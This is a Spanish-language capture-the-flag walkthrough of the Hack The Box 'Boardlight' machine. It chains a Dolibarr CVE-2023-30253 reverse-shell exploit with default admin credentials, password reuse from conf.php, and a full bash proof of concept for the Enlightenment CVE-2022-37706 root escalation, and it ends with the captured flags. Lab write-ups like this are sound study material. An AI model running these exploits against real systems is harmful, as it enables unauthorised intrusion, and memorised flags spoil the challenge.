# Máquina Boardlight (HTB)

- **IP:** 10.129.231.37
- **SO:** Linux (Ubuntu / Apache 2.4.41)
- **Resumen de la cadena:** web estática → fuzzing de vhosts encuentra `crm.board.htb` (Dolibarr 17.0.0) → CVE-2023-30253 (RCE por inyección PHP con login `admin:admin`) → shell como www-data → credenciales en `conf.php` (`serverfun2$2023!!`) → `su larissa` → Enlightenment vulnerable (CVE-2022-37706) → root.
- **Estado:** Completa (user + root).

---

## 1. Reconocimiento

**[en Kali] NMAP:**
```bash
sudo nmap -p- --min-rate 5000 10.129.231.37
sudo nmap -p22,80 -sVC 10.129.231.37
```
```
22/tcp open ssh    OpenSSH 8.2p1
80/tcp open http   Apache httpd 2.4.41 (Ubuntu)
```
- Añadir `board.htb` al `/etc/hosts` (`Ctrl+U` para ver el dominio en el código).

## 2. Enumeración web

**[en Kali] dirsearch:**
```bash
dirsearch -u http://board.htb -e php,html,txt,bak,zip,js -x 403,404 -t 50
```
> /js, /about.php, /contact.php, /css, /images

**[en Kali] gobuster (directorios):**
```bash
gobuster dir -u http://board.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50 -o gobuster_dirs.txt
```

**[en Kali] gobuster (vhosts) — CLAVE:**
```bash
gobuster vhost -u http://board.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 50 -o gobuster_vhosts.txt
# crm.board.htb  Status: 200 [Size: 6360]   <-- dominio clave
```
- Añadir `crm.board.htb` al `/etc/hosts`.
> [captura: login de Dolibarr 17.0.0]

**[en Kali] (alternativa) fuzzing de vhost con ffuf filtrando por tamaño:**
```bash
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 3421
```

## 3. Explotación — Dolibarr CVE-2023-30253

**Credenciales por defecto:** `admin:admin` entra en el CRM.

**[en Kali] Clonar y usar el PoC (Dolibarr <= 17.0.0 / CVE-2023-30253):**
```bash
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
python3 exploit.py                       # ver ayuda
# uso: python3 exploit.py <TARGET> <USER> <PASS> <LHOST> <LPORT>
python3 exploit.py http://crm.board.htb admin admin 10.10.17.1 4444
```

**[en Kali] Listener:**
```bash
nc -lvnp 4444
```
> [captura: shell como www-data en /html/crm.board.htb]

## 4. Movimiento lateral — www-data → larissa

**[en la víctima] Buscar credenciales en la config de Dolibarr:**
```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
# $dolibarr_main_db_user='dolibarrowner';
# $dolibarr_main_db_pass='serverfun2$2023!!';
```

**[en la víctima] Usuarios con shell y reuso de contraseña:**
```bash
cat /etc/passwd | grep -E "sh$"   # root y larissa
su larissa
# Password: serverfun2$2023!!
```

**[en la víctima] Flag de usuario:**
```bash
cd /home/larissa
cat user.txt
# 83305086a9e41a276ea6c515f6a18eb3
```

## 5. Escalada de privilegios — Enlightenment CVE-2022-37706

**[en la víctima] Buscar binarios SUID y software con versión:**
```bash
find / -perm -4000 -type f 2>/dev/null
ls /usr/lib/eject/dmcrypt-get-device    # binario de Enlightenment con SUID
dpkg -l | grep enlightenment            # versión 0.23.1-4 → vulnerable
```

**Exploit:** CVE-2022-37706 (Enlightenment `enlightenment_sys` local privesc). El exploit de msfconsole no funcionó, así que se usa el PoC en bash manualmente:

**[en la víctima] Crear el `exploit.sh`** (PoC CVE-2022-37706) — como `nano` no estaba disponible se escribió con `cat > exploit.sh << 'EOF'`:
```bash
cat > exploit.sh << 'EOF'
#!/bin/bash
echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z "$file" ]]; then
  echo "[-] Couldn't find the vulnerable SUID file..."
  echo "[*] Enlightenment should be installed on your system."
  exit 1
fi
echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
EOF
```

**[en la víctima] Dar permisos y ejecutar:**
```bash
chmod +x exploit.sh
./exploit.sh
# y nos da root
cat /root/root.txt
# caf6b218de2dec3ae212fd1988e3ad29
```

---

### Flags
| Flag | Valor |
|------|-------|
| user.txt | `83305086a9e41a276ea6c515f6a18eb3` |
| root.txt | `caf6b218de2dec3ae212fd1988e3ad29` |
